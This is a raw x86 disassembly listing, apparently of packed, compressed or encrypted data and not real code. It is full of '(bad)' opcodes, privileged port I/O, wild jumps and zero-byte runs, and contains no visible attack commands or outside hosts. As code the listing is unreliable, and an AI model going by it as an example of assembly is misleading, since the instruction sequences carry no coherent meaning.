  41e5c9:	add    BYTE PTR [eax],al
  41e5cb:	daa    
  41e5cc:	push   ecx
  41e5cd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41e5d7:	pop    ecx
  41e5d8:	icebp  
  41e5d9:	xor    eax,0x1a2be2b
  41e5de:	add    BYTE PTR [ebp-0x41000000],ch
  41e5e4:	fs loopne 0x41e613
  41e5e7:	loopne 0x41e57b
  41e5e9:	out    dx,eax
  41e5ea:	inc    edx
  41e5eb:	jmp    DWORD PTR [edx]
  41e5ed:	(bad)  
  41e5ee:	into   
  41e5ef:	ins    DWORD PTR es:[edi],dx
  41e5f0:	xor    ecx,DWORD PTR [eax]
  41e5f2:	jmp    0xc293acb5
  41e5f7:	call   0xbc2fe46f
  41e5fc:	cdq    
  41e5fd:	std    
  41e5fe:	ins    BYTE PTR es:[edi],dx
  41e5ff:	and    esi,DWORD PTR [edx]
  41e601:	es jge 0x41e64d
  41e604:	dec    esi
  41e605:	(bad)  
  41e606:	data16 mov ss,WORD PTR [ebp+0x78]
  41e60a:	push   DWORD PTR [edi-0x20]
  41e60d:	hlt    
  41e60e:	rcr    DWORD PTR [eax+0x54ed9454],0x7d
  41e615:	lahf   
  41e616:	bound  ecx,QWORD PTR ds:[ecx+0x491dff98]
  41e61d:	mov    esi,0x2ee38fd4
  41e622:	das    
  41e623:	push   esi
  41e624:	ins    DWORD PTR es:[edi],dx
  41e625:	xchg   esi,eax
  41e626:	add    DWORD PTR [edi-0x616490d4],esi
  41e62c:	inc    esp
  41e62d:	pop    eax
  41e62e:	(bad)  
  41e630:	sbb    al,BYTE PTR [eax+0x320656bc]
  41e636:	jno    0x41e6b4
  41e638:	in     al,0xd7
  41e63a:	dec    edi
  41e63b:	push   cs
  41e63c:	cmp    ebx,eax
  41e63e:	jmp    0x41e60e
  41e640:	sbb    BYTE PTR [ebx],ah
  41e642:	stos   DWORD PTR es:[edi],eax
  41e643:	push   es
  41e644:	fst    st(0)
  41e646:	mov    ds,WORD PTR [edi+0x6d]
  41e649:	je     0x41e609
  41e64b:	push   ss
  41e64c:	push   edi
  41e64d:	mov    dl,0x9e
  41e64f:	aas    
  41e650:	sub    ah,dl
  41e652:	xchg   DWORD PTR [eax+ebx*2],ecx
  41e655:	test   edx,ebp
  41e657:	or     eax,0xf234dffd
  41e65c:	test   DWORD PTR [edx+eiz*2],edx
  41e65f:	lock loop 0x41e664
  41e662:	sub    cl,bl
  41e664:	ins    BYTE PTR es:[edi],dx
  41e665:	pop    es
  41e666:	ss ret 0xfa1b
  41e66a:	shr    bl,cl
  41e66c:	pop    ds
  41e66d:	mov    ah,BYTE PTR [ecx+0x57726a57]
  41e673:	fcom   QWORD PTR [eax]
  41e675:	retf   0x7937
  41e678:	int    0xab
  41e67a:	(bad)  
  41e67c:	jae    0x41e6e2
  41e67e:	cwde   
  41e67f:	sbb    BYTE PTR [ebx],bh
  41e681:	rcr    BYTE PTR [edi+0x7d],cl
  41e684:	mov    es,WORD PTR [esi]
  41e686:	(bad)  
  41e689:	xlat   BYTE PTR ds:[ebx]
  41e68a:	adc    al,0xa2
  41e68c:	adc    ah,BYTE PTR [ebx+0x659f]
	...
  41e69a:	add    BYTE PTR [esi],dh
  41e69c:	add    dl,BYTE PTR [ebp+0xc]
  41e69f:	jne    0x41e700
  41e6a1:	jg     0x41e6dd
  41e6a3:	clc    
  41e6a4:	cs aas 
  41e6a6:	push   0x56b9361b
  41e6ab:	push   0xffffff8a
  41e6ad:	add    DWORD PTR [eax],eax
  41e6af:	lods   eax,DWORD PTR ds:[esi]
  41e6b0:	add    BYTE PTR [eax],al
  41e6b2:	add    BYTE PTR [edi+0x4],bh
  41e6b5:	cmp    esp,DWORD PTR fs:[ebp+0x6d]
  41e6b9:	enter  0x8b65,0x4c
  41e6bd:	out    dx,al
  41e6be:	xor    al,0xab
  41e6c0:	retf   0x2d50
  41e6c3:	mov    eax,ds:0xefe9905b
  41e6c8:	jmp    0x61427354
  41e6cd:	jle    0x41e707
  41e6cf:	dec    esi
  41e6d0:	lea    ebp,[ecx+0x4dda5d34]
  41e6d6:	mov    eax,0xefe0a1b7
  41e6db:	push   0xbd67e639
  41e6e0:	shl    al,0xc5
  41e6e3:	mov    bl,0xa4
  41e6e5:	out    dx,al
  41e6e6:	fnstcw WORD PTR ds:0x4b3e1abc
  41e6ec:	xor    al,0xfd
  41e6ef:	in     eax,0xbc
  41e6f1:	clc    
  41e6f2:	xor    al,0xbb
  41e6f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6f5:	add    edx,DWORD PTR [edx+ebp*2]
  41e6f8:	imul   eax,DWORD PTR ds:0x341b3e9b,0x4afafc61
  41e702:	mov    ?,WORD PTR [eax]
  41e704:	add    DWORD PTR [edi-0xa],ecx
  41e707:	cdq    
  41e708:	mov    ecx,0x99454c2c
  41e70d:	jl     0x41e736
  41e70f:	and    BYTE PTR [edx],dl
  41e711:	mov    eax,ds:0x1e3e1879
  41e716:	and    ebx,DWORD PTR [ecx+esi*4+0x31229b85]
  41e71d:	stos   DWORD PTR es:[edi],eax
  41e71e:	mov    dl,0xfa
  41e720:	mov    bh,0x6d
  41e722:	leave  
  41e723:	es shl ebp,0xde
  41e727:	adc    eax,0x78e2b003
  41e72c:	or     DWORD PTR [eax],esp
  41e72e:	add    ebx,DWORD PTR [edi-0x4f]
  41e731:	push   edi
  41e732:	dec    eax
  41e733:	popf   
  41e734:	repz pusha 
  41e736:	lds    eax,FWORD PTR [eax+0x8e6d37]
  41e73c:	mov    ds:0xa019b858,eax
  41e741:	pop    esp
  41e742:	pop    esi
  41e743:	cmp    DWORD PTR [edi-0x4ecfaa01],0x65e45502
  41e74d:	mov    ebp,DWORD PTR [edi]
  41e74f:	add    al,0x54
  41e751:	imul   ebp,DWORD PTR [ecx-0xa],0x4547eede
  41e758:	add    eax,0x9bd7a9c
  41e75d:	addr16 leave 
  41e75f:	jbe    0x41e761
	...
  41e769:	add    BYTE PTR [eax],al
  41e76b:	or     BYTE PTR [ecx-0x404c48e],dh
  41e771:	dec    ecx
  41e772:	mov    bl,0x94
  41e774:	je     0x41e74d
  41e776:	call   0x8b17:0x3f0d7a55
  41e77d:	add    DWORD PTR [eax],eax
  41e77f:	lods   eax,DWORD PTR ds:[esi]
  41e780:	add    BYTE PTR [eax],al
  41e782:	add    BYTE PTR [eax-0x2b985d18],dl
  41e788:	sbb    BYTE PTR [ebx+0x1d52273e],0x78
  41e78f:	cli    
  41e790:	leave  
  41e791:	shl    BYTE PTR [ebx],0x70
  41e794:	in     eax,0x84
  41e796:	add    eax,0xb597181d
  41e79b:	inc    esi
  41e79c:	sub    BYTE PTR [esi-0x65],bh
  41e79f:	push   ss
  41e7a0:	ins    DWORD PTR es:[edi],dx
  41e7a1:	loopne 0x41e727
  41e7a3:	sub    BYTE PTR [edx+0x385f202],0xb0
  41e7aa:	xchg   edx,edi
  41e7ac:	inc    eax
  41e7ad:	pextrw edi,(bad),0xc5
  41e7af:	aas    
  41e7b0:	push   ds
  41e7b1:	hlt    
  41e7b2:	mov    al,es:0xb871d420
  41e7b8:	jmp    0x41e73f
  41e7ba:	jg     0x41e7ce
  41e7bc:	mov    ds:0xbbac789e,eax
  41e7c1:	mov    ah,0xb8
  41e7c3:	leave  
  41e7c4:	adc    eax,0xd695d6a2
  41e7c9:	ins    DWORD PTR es:[edi],dx
  41e7ca:	xor    eax,0x5133786a
  41e7cf:	hlt    
  41e7d0:	mov    dl,0x46
  41e7d2:	fninit 
  41e7d4:	daa    
  41e7d5:	mov    al,0x4f
  41e7d7:	test   eax,0xe084f213
  41e7dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7dd:	pop    ds
  41e7de:	xor    eax,0x8d1d1f57
  41e7e3:	aam    0x95
  41e7e5:	rcl    edi,cl
  41e7e7:	jge    0x41e7a8
  41e7e9:	fbld   TBYTE PTR [eax+0x5b]
  41e7ec:	xchg   ebx,eax
  41e7ed:	adc    bl,BYTE PTR [edi-0x1bcc58c9]
  41e7f3:	push   ds
  41e7f4:	sahf   
  41e7f5:	jl     0x41e827
  41e7f7:	pop    esp
  41e7f8:	mov    eax,0xe9ffe645
  41e7fd:	test   DWORD PTR [eax],0xfd0e2a8a
  41e803:	cmp    eax,0x4235a544
  41e808:	dec    esp
  41e809:	aam    0x92
  41e80b:	sub    dl,BYTE PTR [edx+0x36]
  41e80e:	int3   
  41e80f:	ds pop ebp
  41e811:	jg     0x41e7d5
  41e813:	pop    ebx
  41e814:	sub    al,0x4a
  41e816:	cmp    dh,0x1a
  41e819:	imul   eax,DWORD PTR [ebx-0x2e8d75d5],0x400dfd93
  41e823:	adc    bh,cl
  41e825:	add    edx,ebx
  41e827:	out    dx,eax
  41e828:	jo     0x41e7f2
  41e82a:	rcl    DWORD PTR [esi+0x30b8a558],0x0
	...
  41e839:	add    BYTE PTR [eax],al
  41e83b:	fist   WORD PTR [ebx-0x4e]
  41e83e:	dec    edi
  41e83f:	mov    esi,0x67d3ffef
  41e844:	xchg   ecx,edi
  41e846:	adc    al,0x9c
  41e848:	and    dl,BYTE PTR [ecx]
  41e84a:	push   ebx
  41e84b:	les    ecx,FWORD PTR [ebx+0xad0001]
  41e851:	add    BYTE PTR [eax],al
  41e853:	inc    ebx
  41e854:	leave  
  41e855:	inc    ebp
  41e856:	or     BYTE PTR [ebx],bh
  41e858:	xor    eax,0xc61509e5
  41e85d:	push   ebp
  41e85e:	sahf   
  41e85f:	xchg   ebx,eax
  41e860:	mov    bl,0x1a
  41e862:	imul   edi,DWORD PTR [ebx],0xb9cc47ae
  41e868:	sbb    BYTE PTR [ecx+0x41],ah
  41e86b:	int3   
  41e86c:	or     BYTE PTR [ecx-0x143f9af7],dl
  41e872:	jp     0x41e841
  41e874:	mov    esp,0x750c03de
  41e879:	loopne 0x41e894
  41e87b:	aam    0xe5
  41e87d:	lds    ebx,FWORD PTR [eax]
  41e87f:	(bad)  
  41e880:	xlat   BYTE PTR ds:[ebx]
  41e881:	push   edi
  41e882:	not    BYTE PTR ds:0xb8897d64
  41e888:	frstor [edx+0x7b3c0a85]
  41e88e:	jno    0x41e8ce
  41e890:	or     al,0x49
  41e892:	mov    ch,BYTE PTR [ecx-0x247ad8f9]
  41e898:	jecxz  0x41e8b0
  41e89a:	clc    
  41e89b:	fucomp st(3)
  41e89d:	inc    esi
  41e89e:	fwait
  41e89f:	xor    esp,DWORD PTR [edx+0x44d3a986]
  41e8a5:	js     0x41e859
  41e8a7:	xlat   BYTE PTR ds:[ebx]
  41e8a8:	iret   
  41e8a9:	std    
  41e8aa:	lds    esp,FWORD PTR [esi]
  41e8ac:	and    dh,BYTE PTR [ebp+0x9c46f45]
  41e8b2:	and    al,0x8
  41e8b4:	and    cl,BYTE PTR fs:0x1a0ac94f
  41e8bb:	aas    
  41e8bc:	sahf   
  41e8bd:	and    DWORD PTR [edi-0x47fd3141],0x580c1155
  41e8c7:	iret   
  41e8c8:	ss pusha 
  41e8ca:	cmp    al,0xdd
  41e8cc:	cld    
  41e8cd:	cld    
  41e8ce:	add    BYTE PTR [esi+0x67],ch
  41e8d1:	in     al,dx
  41e8d2:	(bad)  
  41e8d3:	bound  eax,QWORD PTR [eax+edx*8]
  41e8d6:	dec    edi
  41e8d7:	repnz cdq 
  41e8d9:	pop    ebp
  41e8da:	jmp    0xedc9:0x39c1f762
  41e8e1:	and    BYTE PTR [edi],0x69
  41e8e4:	mov    bh,0x6b
  41e8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8e7:	or     esp,DWORD PTR [esi]
  41e8e9:	mov    ebp,0xcfa1ea76
  41e8ee:	das    
  41e8ef:	outs   dx,BYTE PTR ds:[esi]
  41e8f0:	sar    ebx,0xf8
  41e8f3:	inc    edi
  41e8f4:	ss xchg bl,dl
  41e8f7:	adc    edx,0x40
  41e8fa:	sub    di,sp
  41e8fd:	mov    ch,0x65
  41e8ff:	mov    ds:0x0,al
  41e904:	add    BYTE PTR [eax],al
  41e906:	add    BYTE PTR [eax],al
  41e908:	add    BYTE PTR [eax],al
  41e90a:	add    BYTE PTR [edi-0x24252cf4],al
  41e910:	fisttp WORD PTR [edi+0x640ccb5d]
  41e916:	push   ss
  41e917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e918:	fstp   QWORD PTR [ecx+0x3]
  41e91b:	jno    0x41e8a9
  41e91d:	add    DWORD PTR [eax],eax
  41e91f:	lods   eax,DWORD PTR ds:[esi]
  41e920:	add    BYTE PTR [eax],al
  41e922:	add    bl,dh
  41e924:	scas   eax,DWORD PTR es:[edi]
  41e925:	mov    DWORD PTR [edx+0x4bf7efbb],ebx
  41e92b:	rol    BYTE PTR [edx-0x1e],1
  41e92e:	and    eax,DWORD PTR [ebx+0x14dc1c66]
  41e934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e935:	pushf  
  41e936:	sub    dl,ch
  41e938:	shl    BYTE PTR [esi],1
  41e93a:	in     al,0xd1
  41e93c:	jns    0x41e971
  41e93e:	jl     0x41e951
  41e940:	pop    ebp
  41e941:	popa   
  41e942:	jmp    FWORD PTR fs:[ebx-0x90ae5c9]
  41e949:	ja     0x41e970
  41e94b:	xchg   edi,eax
  41e94c:	mov    ch,0x5f
  41e94e:	ret    
  41e94f:	cmp    ecx,DWORD PTR fs:[edx-0x547f0fe6]
  41e956:	in     al,0x3a
  41e958:	mov    WORD PTR [eax-0x1],ss
  41e95b:	inc    esp
  41e95c:	iret   
  41e95d:	imul   edi,DWORD PTR [ebx-0x35b60da9],0x24
  41e964:	or     BYTE PTR [ebx+0xd5ae4ff],0x68
  41e96b:	push   esp
  41e96d:	jl     0x41e94c
  41e96f:	or     eax,0xfdf90f5e
  41e974:	add    eax,0xba39ab55
  41e979:	inc    ebp
  41e97a:	lock out dx,eax
  41e97c:	in     eax,dx
  41e97d:	sub    eax,0x5e77b1dd
  41e982:	repnz pop ebp
  41e984:	lds    edx,FWORD PTR [edi-0x5f]
  41e987:	add    BYTE PTR [ebp-0x45afebc3],cl
  41e98d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e98e:	scas   eax,DWORD PTR es:[edi]
  41e98f:	jmp    0x41e91f
  41e991:	pop    esp
  41e992:	sbb    dl,BYTE PTR [ebx]
  41e994:	cs sti 
  41e996:	mov    esi,0xe30840eb
  41e99b:	scas   al,BYTE PTR es:[edi]
  41e99c:	push   ecx
  41e99d:	int3   
  41e99e:	dec    edi
  41e99f:	into   
  41e9a0:	inc    edi
  41e9a1:	fisub  WORD PTR [ecx-0x4]
  41e9a4:	out    0xfa,eax
  41e9a6:	adc    BYTE PTR [ecx+0x51e54bc],dh
  41e9ac:	(bad)  
  41e9ad:	dec    esp
  41e9ae:	xchg   edi,eax
  41e9af:	jmp    0x41e98a
  41e9b1:	adc    DWORD PTR [esi-0x6ac686cc],edi
  41e9b7:	in     eax,dx
  41e9b8:	sbb    eax,0x841b4aa4
  41e9bd:	fstp   TBYTE PTR [eax-0x6b]
  41e9c0:	mov    ecx,0x77d4fa44
  41e9c5:	out    0x9a,eax
  41e9c7:	out    dx,al
  41e9c8:	gs (bad) 
  41e9ca:	aad    0x91
  41e9cc:	mov    bl,0xbc
  41e9ce:	enter  0x92,0x0
	...
  41e9da:	add    BYTE PTR [edi-0x28db29d],bl
  41e9e0:	jle    0x41e9a1
  41e9e2:	out    dx,eax
  41e9e3:	sbb    edi,esp
  41e9e5:	mov    BYTE PTR [ebp+ecx*4+0x1e92f6cb],dh
  41e9ec:	lea    eax,[ecx]
  41e9ee:	add    BYTE PTR [ebp+0x9000000],ch
  41e9f4:	mov    ds:0xc67f90b9,eax
  41e9f9:	cmp    DWORD PTR [ebp+0x29],ebx
  41e9fc:	mov    WORD PTR [edi],fs
  41e9fe:	repnz enter 0xb4a3,0xe9
  41ea03:	out    dx,al
  41ea04:	jecxz  0x41ea59
  41ea06:	stos   DWORD PTR es:[edi],eax
  41ea07:	jae    0x41ea5a
  41ea09:	in     al,dx
  41ea0a:	in     al,0x40
  41ea0c:	sbb    ebp,esi
  41ea0e:	push   ss
  41ea0f:	ins    DWORD PTR es:[edi],dx
  41ea10:	jmp    0xae3714ab
  41ea15:	xor    BYTE PTR [esi-0x3af4b581],al
  41ea1b:	push   esi
  41ea1c:	dec    eax
  41ea1d:	into   
  41ea1e:	loopne 0x41e9a2
  41ea20:	fbstp  TBYTE PTR [edi]
  41ea22:	xchg   edi,eax
  41ea23:	dec    esp
  41ea24:	pop    es
  41ea25:	repz pop ecx
  41ea27:	sub    ebx,edi
  41ea29:	add    eax,0x749d5ba2
  41ea2e:	and    eax,0x8126a374
  41ea33:	dec    eax
  41ea34:	das    
  41ea35:	ins    DWORD PTR es:[edi],dx
  41ea36:	out    dx,al
  41ea37:	inc    eax
  41ea38:	aaa    
  41ea39:	out    0x32,eax
  41ea3b:	cmc    
  41ea3c:	pop    ebp
  41ea3d:	push   ebp
  41ea3e:	cli    
  41ea3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea40:	leave  
  41ea41:	ret    
  41ea42:	push   esp
  41ea43:	cs mov bl,0x9d
  41ea46:	imul   ecx,DWORD PTR [eax+0xb],0x18
  41ea4a:	jbe    0x41ea01
  41ea4c:	mov    ds:0x6acceeee,al
  41ea51:	ss (bad) 
  41ea53:	pop    esp
  41ea54:	in     eax,0x8f
  41ea56:	call   0x53c0c931
  41ea5b:	add    DWORD PTR [ebp-0x1527ce13],ebp
  41ea61:	lea    esp,[esi-0x5]
  41ea64:	stos   DWORD PTR es:[edi],eax
  41ea65:	lea    eax,[edx]
  41ea67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea68:	and    DWORD PTR [edi],esp
  41ea6a:	sub    DWORD PTR [ecx],ecx
  41ea6c:	mov    BYTE PTR [ecx+0x56264738],0x54
  41ea73:	inc    ebp
  41ea74:	xchg   edi,eax
  41ea75:	and    al,0x89
  41ea77:	push   eax
  41ea78:	mov    ds:0x9c536a98,eax
  41ea7d:	cld    
  41ea7e:	cwde   
  41ea7f:	xchg   ebp,eax
  41ea80:	out    0x2a,al
  41ea82:	jecxz  0x41ea88
  41ea84:	inc    ebx
  41ea85:	push   0xffffff9f
  41ea87:	mov    edx,0x5a88ac7a
  41ea8c:	jb     0x41ea2c
  41ea8e:	mov    edi,0x8fe9f2b6
  41ea93:	sub    cl,ch
  41ea95:	imul   esp,DWORD PTR [ebp-0x117fd8d0],0xa4cda64c
  41ea9f:	push   cs
	...
  41eaa8:	add    BYTE PTR [eax],al
  41eaaa:	add    BYTE PTR [eax+0x23],dh
  41eaad:	and    eax,0x7c6f7769
  41eab2:	cmp    esp,DWORD PTR [eax-0x624311e4]
  41eab8:	cmp    ecx,ebx
  41eaba:	xlat   BYTE PTR ds:[ebx]
  41eabb:	retf   
  41eabc:	lea    eax,[ecx]
  41eabe:	add    BYTE PTR [ebp+0x30000000],ch
  41eac4:	in     eax,dx
  41eac5:	scas   eax,DWORD PTR es:[edi]
  41eac6:	adc    esi,ebx
  41eac8:	jl     0x41eb35
  41eaca:	fadd   DWORD PTR [edi-0x7b096d42]
  41ead0:	adc    ch,al
  41ead2:	iret   
  41ead3:	xchg   DWORD PTR [ebx+0x77],edx
  41ead6:	ss jge 0x41ea9c
  41ead9:	es out dx,al
  41eadb:	mov    dl,0x3a
  41eadd:	jno    0x41eb1b
  41eadf:	adc    ah,BYTE PTR [edi+eiz*8+0x1b]
  41eae3:	in     eax,0xdc
  41eae5:	and    eax,DWORD PTR [esp+eax*2-0x1d3f0bab]
  41eaec:	inc    eax
  41eaed:	leave  
  41eaee:	out    dx,al
  41eaef:	adc    edi,ecx
  41eaf1:	dec    edx
  41eaf2:	je     0x41eae7
  41eaf4:	repz sub BYTE PTR [edi],bh
  41eaf7:	pop    ds
  41eaf8:	mov    edi,0x865f7521
  41eafd:	sub    al,0x9b
  41eaff:	stc    
  41eb00:	pop    ss
  41eb01:	imul   ebp,DWORD PTR [eax-0x65],0xffffff8f
  41eb05:	(bad)  
  41eb06:	test   al,0x8e
  41eb08:	shl    DWORD PTR [edx+eiz*2],cl
  41eb0b:	test   BYTE PTR [ecx-0x48],bl
  41eb0e:	shl    edx,0x22
  41eb11:	mov    ah,0x8
  41eb13:	inc    ebx
  41eb14:	and    DWORD PTR [edi-0x12],0x881edd0c
  41eb1b:	cmp    DWORD PTR [edx+0x55],0x11
  41eb1f:	pop    ecx
  41eb20:	cdq    
  41eb21:	jno    0x41eb1e
  41eb23:	mov    ah,0x5d
  41eb25:	mov    esi,DWORD PTR ds:0xcd2d531e
  41eb2b:	adc    ebx,ecx
  41eb2d:	inc    ebx
  41eb2e:	shr    BYTE PTR [esp+esi*4],cl
  41eb31:	sub    BYTE PTR [ecx-0x4],bl
  41eb34:	cmp    al,0x6b
  41eb36:	and    DWORD PTR cs:[edi+0x5f55ead9],ecx
  41eb3d:	push   ebx
  41eb3e:	loopne 0x41eb60
  41eb40:	cmp    edi,eax
  41eb42:	mov    gs,WORD PTR [edx]
  41eb44:	call   0x49948627
  41eb49:	or     DWORD PTR [eax],0x8e41311e
  41eb4f:	mov    ds:0x4aa0566f,al
  41eb54:	fisttp WORD PTR [edx]
  41eb56:	jns    0x41ebc8
  41eb58:	and    DWORD PTR [ebp-0x55385898],0x64cd9d5e
  41eb62:	ror    BYTE PTR [eax],cl
  41eb64:	ins    BYTE PTR es:[edi],dx
  41eb65:	jo     0xffda027f
  41eb6b:	iret   
  41eb6c:	jo     0x41eb42
  41eb6e:	loopne 0x41eb2a
	...
  41eb78:	add    BYTE PTR [eax],al
  41eb7a:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  41eb81:	popf   
  41eb82:	aam    0x57
  41eb84:	(bad)
  41eb88:	cs faddp st(0),st
  41eb8b:	js     0x41eb1b
  41eb8d:	add    DWORD PTR [eax],eax
  41eb8f:	lods   eax,DWORD PTR ds:[esi]
  41eb90:	add    BYTE PTR [eax],al
  41eb92:	add    BYTE PTR [eax],dh
  41eb94:	repz ret 0xe585
  41eb98:	xchg   DWORD PTR [ebx],edx
  41eb9a:	cmc    
  41eb9b:	dec    eax
  41eb9c:	test   cl,ch
  41eb9e:	test   al,0x9a
  41eba0:	push   0x39b50cb7
  41eba5:	pop    esi
  41eba6:	shl    BYTE PTR [edx],1
  41eba8:	mov    BYTE PTR [ecx+0x3f],bl
  41ebab:	jns    0x41eb58
  41ebad:	jle    0x41eb83
  41ebaf:	mov    ds:0xa9301f3b,al
  41ebb4:	arpl   WORD PTR [eax+0x4b1a7b27],ax
  41ebba:	mov    edi,0x36e8f8f8
  41ebbf:	jae    0x41ebe1
  41ebc1:	inc    esi
  41ebc2:	jle    0x41ebe2
  41ebc4:	imul   esi,DWORD PTR [edx-0x1a4dd180],0x4294b186
  41ebce:	sbb    bl,dl
  41ebd0:	fld    TBYTE PTR [edi+ebp*8]
  41ebd3:	xchg   ebx,eax
  41ebd4:	adc    DWORD PTR [ecx-0x70fa569],ebp
  41ebda:	mov    edi,0x2384c6fb
  41ebdf:	mov    eax,DWORD PTR [edx+0x41]
  41ebe2:	xor    edi,DWORD PTR [ecx-0x46157ce8]
  41ebe8:	cmp    BYTE PTR [esi],dh
  41ebea:	mov    ebp,0x38d661ec
  41ebef:	fdiv   DWORD PTR [ecx+0x25]
  41ebf2:	mov    ebp,0x148a9783
  41ebf7:	call   0xbcb2570
  41ebfc:	pop    es
  41ebfd:	inc    ecx
  41ebfe:	dec    esi
  41ebff:	and    dh,BYTE PTR [edx-0x30]
  41ec02:	sub    bl,bh
  41ec04:	or     esp,eax
  41ec06:	sbb    dl,BYTE PTR [esi]
  41ec08:	pop    esi
  41ec09:	pop    edx
  41ec0a:	pusha  
  41ec0b:	mov    ebp,0x66f40297
  41ec10:	and    ah,al
  41ec12:	stos   BYTE PTR es:[edi],al
  41ec13:	jns    0x41ebc4
  41ec15:	sbb    ecx,ecx
  41ec17:	ret    
  41ec18:	adc    edi,edx
  41ec1a:	rcl    DWORD PTR [eax+0x5a2ac7fd],0x9e
  41ec21:	gs inc ebx
  41ec24:	sbb    eax,0x5fa0b379
  41ec29:	add    ch,BYTE PTR [eax-0x2a]
  41ec2c:	cmp    eax,0x92dc221
  41ec31:	cwde   
  41ec32:	sahf   
  41ec33:	sub    al,0x98
  41ec35:	pusha  
  41ec36:	xor    BYTE PTR [ebp-0x6c],dl
  41ec39:	jnp    0x41ec05
  41ec3b:	lock xchg edi,eax
  41ec3d:	xchg   ebp,eax
  41ec3e:	aas    
  41ec3f:	xchg   DWORD PTR [eax],eax
	...
  41ec49:	add    BYTE PTR [eax],al
  41ec4b:	hlt    
  41ec4c:	mov    dl,0x32
  41ec4e:	(bad)  
  41ec4f:	jbe    0x41ec27
  41ec51:	hlt    
  41ec52:	mov    dl,0xb1
  41ec54:	and    al,0xfe
  41ec56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec57:	js     0x41ebfc
  41ec59:	adc    bl,dh
  41ec5b:	and    eax,0xad00018f
  41ec60:	add    BYTE PTR [eax],al
  41ec62:	add    BYTE PTR [ecx-0x3541937f],ah
  41ec68:	pop    edx
  41ec69:	stos   BYTE PTR es:[edi],al
  41ec6a:	pushf  
  41ec6b:	push   ss
  41ec6c:	cmp    bl,BYTE PTR [esi-0x4c]
  41ec6f:	popf   
  41ec70:	mov    dl,0xa1
  41ec72:	mov    ds:0xbdb3c25,al
  41ec77:	pop    ebp
  41ec78:	xor    al,BYTE PTR [ebp-0x39dd93a8]
  41ec7e:	test   DWORD PTR [eax-0x5c4e3b19],eax
  41ec84:	ret    0x2416
  41ec87:	xor    BYTE PTR [ecx-0x22],bl
  41ec8a:	mov    WORD PTR [ebp-0x3a],ds
  41ec8d:	es xchg esi,eax
  41ec8f:	jo     0x41ec3e
  41ec91:	es mul eax
  41ec94:	cmp    bl,bl
  41ec96:	sub    al,0x89
  41ec98:	push   ss
  41ec99:	dec    esi
  41ec9a:	push   esi
  41ec9b:	dec    edi
  41ec9c:	mov    eax,ds:0x40253ec8
  41eca1:	pushf  
  41eca2:	test   BYTE PTR fs:[ecx+0x1a],ch
  41eca6:	jle    0x41ec6c
  41eca8:	sub    eax,0xb647e003
  41ecad:	pop    edi
  41ecaf:	mov    WORD PTR ds:0xcf2a7ee1,?
  41ecb5:	xor    eax,0x51e3f28e
  41ecba:	imul   BYTE PTR [esi+0x61]
  41ecbd:	xchg   esi,eax
  41ecbe:	jae    0x41ed2b
  41ecc0:	(bad)  [eax+0x1ca594ac]
  41ecc6:	pop    edi
  41ecc7:	pop    es
  41ecc8:	mov    edx,0x4fae53b1
  41eccd:	inc    edx
  41ecce:	out    dx,eax
  41eccf:	rol    ebx,cl
  41ecd1:	jmp    0x2db:0xc325323b
  41ecd8:	pop    ebx
  41ecd9:	jp     0x41ed12
  41ecdb:	mov    ebx,0x94808d64
  41ece0:	sar    DWORD PTR ds:[edi-0x44],0xa1
  41ece5:	popf   
  41ece6:	test   BYTE PTR [edi+0x21045f5b],bh
  41ecec:	cmp    DWORD PTR [ebx+0x77],0x35
  41ecf0:	imul   esp,DWORD PTR [esi+eax*2-0x4d623307],0x63
  41ecf8:	xor    edi,DWORD PTR [ecx]
  41ecfa:	mov    WORD PTR [ebp-0x21],gs
  41ecfd:	sub    eax,0xcfaab638
  41ed02:	retf   
  41ed03:	call   0xeec0:0x4e22af8b
  41ed0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed0b:	ja     0x41ecda
  41ed0d:	in     eax,0x4b
  41ed0f:	xor    al,BYTE PTR [eax]
	...
  41ed19:	add    BYTE PTR [eax],al
  41ed1b:	xor    dl,bl
  41ed1d:	into   
  41ed1e:	mov    ds:0xd37ebfef,al
  41ed23:	sub    edi,DWORD PTR [esi]
  41ed25:	out    0x3f,eax
  41ed27:	pusha  
  41ed28:	imul   esp,DWORD PTR [edx+0x18fd2fe],0x0
  41ed2f:	lods   eax,DWORD PTR ds:[esi]
  41ed30:	add    BYTE PTR [eax],al
  41ed32:	add    al,ah
  41ed34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed35:	sar    bh,0x4e
  41ed38:	outs   dx,DWORD PTR ds:[esi]
  41ed39:	and    al,0x7e
  41ed3b:	dec    esp
  41ed3c:	sbb    al,0x47
  41ed3e:	sar    cl,1
  41ed40:	xor    al,0xa1
  41ed42:	fidivr DWORD PTR ds:0xaa46a3d
  41ed48:	loop   0x41ece9
  41ed4a:	test   DWORD PTR [ebx],ebx
  41ed4c:	ret    0x1d98
  41ed4f:	aam    0xd0
  41ed51:	cdq    
  41ed52:	call   0x985be54e
  41ed57:	sub    DWORD PTR ds:0x4e142db4,esp
  41ed5d:	das    
  41ed5e:	rol    ebx,0xf6
  41ed61:	inc    esp
  41ed62:	lahf   
  41ed63:	stos   BYTE PTR es:[edi],al
  41ed64:	out    0x38,al
  41ed66:	fnstenv [ebx]
  41ed68:	adc    cl,BYTE PTR [esi]
  41ed6a:	(bad)  
  41ed6b:	pop    ebp
  41ed6c:	cli    
  41ed6d:	dec    edx
  41ed6e:	popa   
  41ed6f:	pop    eax
  41ed70:	mov    cl,0x70
  41ed72:	in     al,dx
  41ed73:	inc    edi
  41ed74:	out    0x15,eax
  41ed76:	test   eax,0xf5e94c4
  41ed7b:	mov    ah,0x32
  41ed7d:	loop   0x41ed38
  41ed7f:	sti    
  41ed80:	sbb    ebx,DWORD PTR [ecx]
  41ed82:	dec    ecx
  41ed83:	xchg   ecx,eax
  41ed84:	xor    ah,BYTE PTR [edx]
  41ed86:	mov    ecx,0xc58aa383
